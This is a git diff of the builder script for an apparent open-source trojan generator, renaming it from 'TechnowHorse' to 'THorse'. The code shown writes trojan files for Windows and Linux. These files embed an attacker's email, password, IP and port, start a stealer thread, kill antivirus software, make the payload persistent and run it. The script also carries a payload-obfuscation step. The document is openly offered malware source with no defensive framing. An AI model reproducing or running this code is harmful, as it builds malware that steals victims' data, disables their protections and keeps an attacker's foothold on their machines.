@@ -19,7 +19,7 @@ elif platform.system() == 'Linux':
     PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_options():
-    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechnowHorse v1.7')
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}THorse v1.7')
     parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
@@ -116,30 +116,30 @@ def create_trojan(file_name, email, password, ip, port, time_persistent, legitim
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
         file.write("\t\tmutex = None\n")
-        file.write("\t\tprint(\"[+] Disabling TechNowHorse: Already Running\")\n")
+        file.write("\t\tprint(\"[+] Disabling THorse: Already Running\")\n")
 
-        file.write("\telse:\n")  # if no instance running, going to run TechNowHorse
+        file.write("\telse:\n")  # if no instance running, going to run THorse
         
         if arguments.stealer:
             file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt2.start()\n\n")                           #Starting Thread        
 
-        file.write(f"\t\ttechnowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
+        file.write(f"\t\ttHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
         if arguments.kill_av != None and arguments.kill_av != "":
-            file.write(f"\t\ttechnowHorse.kill_av({arguments.kill_av})\n") 
+            file.write(f"\t\ttHorse.kill_av({arguments.kill_av})\n") 
         else:
-            file.write("\t\ttechnowHorse.kill_av()\n")             
-        file.write(f"\t\ttechnowHorse.become_persistent({time_persistent})\n") 
-        file.write("\t\ttechnowHorse.start()\n\n")     
+            file.write("\t\ttHorse.kill_av()\n")             
+        file.write(f"\t\ttHorse.become_persistent({time_persistent})\n") 
+        file.write("\t\ttHorse.start()\n\n")     
         file.write("check_and_start()\n")   
 
 def create_trojan_linux(file_name, email, password, ip, port, time_persistent):    
     with open(file_name, "w+") as file:
         file.write("import payload\n")
         
-        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
-        file.write(f"technowHorse.become_persistent({time_persistent})\n") 
-        file.write("technowHorse.start()\n\n")     
+        file.write(f"tHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
+        file.write(f"tHorse.become_persistent({time_persistent})\n") 
+        file.write("tHorse.start()\n\n")     
                 
         
 def obfuscating_payload(file_name):
@@ -203,7 +203,7 @@ def exit_greet():
     except Exception as e:
         os.system('clear')   
     del_junk_file(arguments.output)
-    print(Fore.GREEN + '''Thank You for using TechNowHorse, Think Great & Touch The Sky!  \n''' + Style.RESET_ALL)
+    print(Fore.GREEN + '''Happy Hacking ~THorse!\n''' + Style.RESET_ALL)
     quit()    
 
 if __name__ == '__main__':
@@ -312,7 +312,7 @@ if __name__ == '__main__':
 
         else:
             print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
-            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowhorse\n")  
+            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/thorse\n")  
     
     except KeyboardInterrupt:        
         exit_greet()
